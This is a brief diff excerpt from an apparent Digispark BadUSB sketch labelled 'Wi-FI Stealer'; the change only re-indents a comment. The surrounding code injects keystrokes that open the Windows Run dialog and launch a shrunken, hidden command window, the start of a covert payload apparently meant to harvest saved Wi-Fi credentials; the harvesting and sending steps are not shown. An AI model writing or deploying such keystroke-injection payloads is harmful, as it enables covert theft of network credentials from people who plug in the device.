@@ -7,7 +7,7 @@ void loop() {
     DigiKeyboard.sendKeyStroke(0);
     DigiKeyboard.delay(2500);
     
-     /* Wi-FI Stealer */
+    /* Wi-FI Stealer */
     DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
     DigiKeyboard.delay(100);
     DigiKeyboard.println("cmd /k mode con: cols=15 lines=1");
